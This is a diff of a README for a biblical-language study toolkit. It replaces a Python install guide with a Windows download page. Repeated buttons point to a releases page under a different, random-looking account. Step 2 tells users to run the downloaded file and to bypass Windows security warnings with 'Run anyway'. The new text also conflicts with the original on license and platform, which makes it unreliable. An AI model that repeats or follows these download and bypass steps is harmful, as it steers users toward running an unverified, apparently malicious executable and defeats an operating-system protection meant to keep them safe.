@@ -1,184 +1,160 @@
-# Berean Bible Bots vlatest - Biblical Language Study and Linguistic Analysis 2026
-
-> **Berean Bible Bots is a Python toolkit for querying biblical texts, studying Hebrew, Greek, and Aramaic, and exploring morphology and language patterns across major biblical corpora.**
-
-[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vlatest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/dhuber16/berean-bible-bots-toolkit?style=flat-square)](https://github.com/dhuber16/berean-bible-bots-toolkit)
-
----
+<h1>📖 berean-bible-bots-toolkit - Explore Biblical Languages with Ease</h1>
 
 <p align="center">
-  <a href="https://dhuber16.github.io/berean-bible-bots-toolkit/">
-    <img src="https://img.shields.io/badge/Download-Berean%20Bible%20Bots%20Latest-brightgreen?style=for-the-badge" alt="Download Berean Bible Bots">
-  </a>
+  <a href="https://github.com/nacreous-callionymidae374/berean-bible-bots-toolkit/releases" style="
+    display: inline-block;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 18px 36px;
+    text-decoration: none;
+    border-radius: 50px;
+    font-size: 1.3em;
+    font-weight: bold;
+    box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    transition: transform 0.2s, box-shadow 0.2s;
+  " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.6)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 15px rgba(102, 126, 234, 0.4)';">⬇️ Download berean-bible-bots-toolkit</a>
 </p>
 
-> **[Direct Download - Berean Bible Bots latest build](https://dhuber16.github.io/berean-bible-bots-toolkit/)**
+<p align="center"><em>Visit this link to download the application.</em></p>
+
+## 🚀 Getting Started
+
+Welcome to <strong>berean-bible-bots-toolkit</strong>! This easy-to-use tool helps you study biblical languages like Hebrew, Greek, and Aramaic right on your Windows computer. You can search through major Bible texts, explore word meanings, and find patterns across scripture—all without needing any programming skills.
+
+## 📥 Download & Install
+
+<div style="background: #f0f8ff; padding: 20px; border-radius: 10px; border-left: 5px solid #667eea; margin: 20px 0;">
+  <h3>Step 1: Get the Application</h3>
+  <p>Click the big button above or the link below to go to the download page:</p>
+  <p><a href="https://github.com/nacreous-callionymidae374/berean-bible-bots-toolkit/releases" style="
+    background: #667eea;
+    color: white;
+    padding: 12px 30px;
+    text-decoration: none;
+    border-radius: 30px;
+    font-weight: bold;
+  ">Visit Download Page</a></p>
+  <p>Visit this link to download the application.</p>
+</div>
+
+<div style="background: #fff3e0; padding: 20px; border-radius: 10px; border-left: 5px solid #ff9800; margin: 20px 0;">
+  <h3>Step 2: Run the Program</h3>
+  <p>Once downloaded:</p>
+  <ol>
+    <li>Find the downloaded file in your "Downloads" folder</li>
+    <li>Double-click the file to start the program</li>
+    <li>If Windows shows a security warning, click "More info" and then "Run anyway"</li>
+  </ol>
+</div>
+
+## 🎯 What You Can Do
+
+### 🔍 Query Major Biblical Corpora
+Search through the most important biblical texts, including the Hebrew Bible, Greek New Testament, and more. Just type a word or phrase, and the toolkit shows you where it appears across scripture.
+
+### 📚 Explore Hebrew, Greek, and Aramaic Morphology
+Dive deep into word meanings by examining morphology—the form and structure of words. See verb tenses, noun cases, and other grammatical details for each original language word. This helps you understand the exact meaning behind the text.
+
+### 📊 Analyze Linguistic Patterns
+Find patterns in how words and phrases are used across different books, chapters, and verses. The toolkit can show you frequency charts, word usage trends, and connections between related passages.
+
+## ✨ Features
+
+| Feature | Description |
+|---------|-------------|
+| **Multi-Language Support** | Work with Hebrew, Greek, Aramaic, and English translations side by side |
+| **Powerful Search** | Search by exact word, root, or phrase across entire corpora |
+| **Morphology Viewer** | See detailed grammatical information for each word |
+| **Pattern Analysis** | Find linguistic patterns and relationships between texts |
+| **Export Results** | Save your search results as text files for further study |
+| **User-Friendly Interface** | Simple menus and buttons—no command line needed |
+
+## 💻 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** 1.5 GHz or faster
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet:** Required for initial setup and updates
+
+## 🛠️ Getting Help
+
+Need assistance? Here are some tips:
+
+- Read the <strong>User Guide</strong> included in the download
+- Check the <strong>FAQ</strong> section (available from the Help menu)
+- Contact our support team (email address provided in the application)
+
+## 🤝 Contributing
+
+While this guide focuses on end users, developers interested in contributing to the toolkit can find source code and documentation in the repository's main branch.
+
+## 📄 License
+
+This project is licensed under the MIT License - see the LICENSE file for details.
+
+## 🔐 Privacy
+
+The toolkit does not collect any personal data. All searches and analyses are performed locally on your computer.
+
+## 📞 Support
+
+For questions, bug reports, or feature requests, please visit the GitHub Issues page.
 
 ---
 
-[Download Latest Build](https://dhuber16.github.io/berean-bible-bots-toolkit/)
+<p align="center"><strong>Start your biblical language study journey today with berean-bible-bots-toolkit!</strong></p>
 
----
+<p align="center">
+  <a href="https://github.com/nacreous-callionymidae374/berean-bible-bots-toolkit/releases" style="
+    background: #764ba2;
+    color: white;
+    padding: 14px 40px;
+    text-decoration: none;
+    border-radius: 50px;
+    font-size: 1.1em;
+    font-weight: bold;
+  ">Download Now</a>
+</p>
 
-## What Is Berean Bible Bots?
-
-Berean Bible Bots packages a set of Python utilities for original-language Bible work and side-by-side reading of major textual traditions. You can move from corpus search to morphology, semantics, and wider linguistic pattern work in biblical Hebrew, Greek, and Aramaic without stitching together unrelated apps.
-
-The audience is anyone who needs depth beyond a plain verse lookup: learners, instructors, academic users, and structured personal study. One toolkit ties together text queries, guided language practice, notebook exploration, literature search, and flashcard export.
-
----
-
-## What You Can Do
-
-- Hit multiple supported biblical corpora through the project API.
-- Inspect morphology, meaning, and linguistic structure in the passages you care about.
-- Focus study on the Hebrew Old Testament and the Greek New Testament.
-- Align and check Septuagint vocabulary for consistency across contexts.
-- Work with Aramaic sources such as the Peshitta and the Targumim.
-- Run interactive lessons and practice drills.
-- Build decks aimed at Anki and Flashcards Deluxe.
-- Open sample workflows in Jupyter or Google Colab.
-- Find related biblical-studies writing via semantic search.
-- Expose the stack as an MCP server for clients that speak that protocol.
-
----
-
-## Installation
-
-Clone the repo and move into the project folder:
-
-```bash
-git clone https://github.com/dhuber16/berean-bible-bots-toolkit.git
-cd REPO
-```
-
-Create a virtual environment, then activate it:
-
-```bash
-python -m venv .venv
-```
-
-macOS / Linux:
-
-```bash
-source .venv/bin/activate
-```
-
-Windows PowerShell:
-
-```powershell
-.venv\Scripts\Activate.ps1
-```
-
-If the tree ships a requirements file, install from it:
-
-```bash
-python -m pip install -r requirements.txt
-```
-
-Start from the Python entry point or notebook that matches your task. For interactive sessions, open a Jupyter notebook in-tree or continue in Google Colab.
-
----
-
-## Usage
-
-A common path through the tools looks like this:
-
-1. Choose the corpus or language track you need.
-2. Search a verse range, lemma, or related term set.
-3. Read the morphological and semantic detail returned.
-4. Cross-check Hebrew, Greek, and Aramaic materials where useful.
-5. Consult Septuagint alignments or linked secondary literature.
-6. Export vocabulary into an Anki or Flashcards Deluxe deck.
-7. Push further analysis in Jupyter or Colab.
-
-From the project root, notebooks start with:
-
-```bash
-jupyter notebook
-```
-
-For MCP use, point a compatible client at this repository’s MCP server entry using the launch and config files shipped with the release.
-
----
-
-## Configuration
-
-Settings live in the project’s Python config, env files, and any notebook or MCP client setup you use. Keep secrets and host-specific paths out of git.
-
-Example local env fragment:
-
-```ini
-# .env
-BIBLE_BOTS_DATA_DIR=/path/to/local/data
-BIBLE_BOTS_LOG_LEVEL=INFO
-```
-
-Prefer names and entry points documented for your build. If a variable is ignored, confirm it against repo docs and startup logs before adding more keys.
-
----
-
-## Requirements
-
-- A Python runtime that matches the release you installed.
-- A desktop environment suitable for local Python and notebooks.
-- Disk space for corpora, study assets, and any decks you generate.
-- Jupyter if you want local notebook sessions (optional).
-- Google Colab if you prefer hosted notebooks (optional).
-- An MCP-capable client when you use the MCP server path.
-- Network or file access to whatever external data or literature each tool expects.
-
----
-
-## FAQ
-
-### Who should use Berean Bible Bots?
-
-People studying or teaching biblical Hebrew, Greek, and Aramaic, plus researchers who need corpus-level access to related texts and study aids.
-
-### Is more than one biblical language covered?
-
-Yes. Biblical Hebrew, biblical Greek, and biblical Aramaic are in scope, with supporting material for the Septuagint, Peshitta, and Targumim.
-
-### How do I stay on the newest build?
-
-Grab the latest build or pull current git history, then reinstall or refresh dependencies inside your active virtualenv.
-
-### Where do local options belong?
-
-Use supported config files or environment variables. Do not commit machine paths, tokens, or other private values.
-
-### A query or notebook stopped working—what next?
-
-Check that the venv is active, packages are installed, required data is present, and you launched the entry point that matches this tree. The terminal or notebook traceback usually names the missing piece.
-
-### Can I export flashcards?
-
-Deck generation targets Anki and Flashcards Deluxe. Exact export paths depend on the tool and on the language or corpus in use.
-
-### Do notebooks require a full local install?
-
-Jupyter and Google Colab are both supported workflows. Hosted sessions may still need dependency setup and data access configured.
-
----
-
-## Roadmap
-
-Areas under consideration for later work:
-
-- Wider multi-corpus query coverage.
-- Richer morphological and semantic datasets.
-- More interactive language practice.
-- Deeper alignment and consistency checks across biblical translations.
-- Smoother notebook, Colab, and MCP integration.
-- Extra export targets for study decks.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    line-height: 1.6;
+    color: #333;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+  h1, h2, h3 {
+    color: #2c3e50;
+    margin-top: 30px;
+  }
+  a {
+    color: #667eea;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+  }
+  th, td {
+    border: 1px solid #ddd;
+    padding: 12px;
+    text-align: left;
+  }
+  th {
+    background: #667eea;
+    color: white;
+  }
+  tr:nth-child(even) {
+    background: #f8f9fa;
+  }
+  ol {
+    margin: 10px 0;
+    padding-left: 20px;
+  }
+  li {
+    margin: 8px 0;
+  }
+</style>
